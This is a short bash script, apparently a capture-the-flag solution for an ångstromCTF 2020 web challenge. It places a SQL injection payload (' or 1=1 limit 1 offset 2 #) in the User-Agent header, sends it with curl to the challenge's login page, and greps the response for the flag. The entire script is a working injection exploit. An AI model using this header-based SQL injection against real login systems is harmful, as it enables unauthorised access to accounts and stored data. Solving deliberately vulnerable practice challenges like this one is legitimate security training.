#!/bin/bash

payload="' or 1=1 limit 1 offset 2 #"

curl -sS https://agents.2020.chall.actf.co/login  -A "$payload" | grep -i actf{  

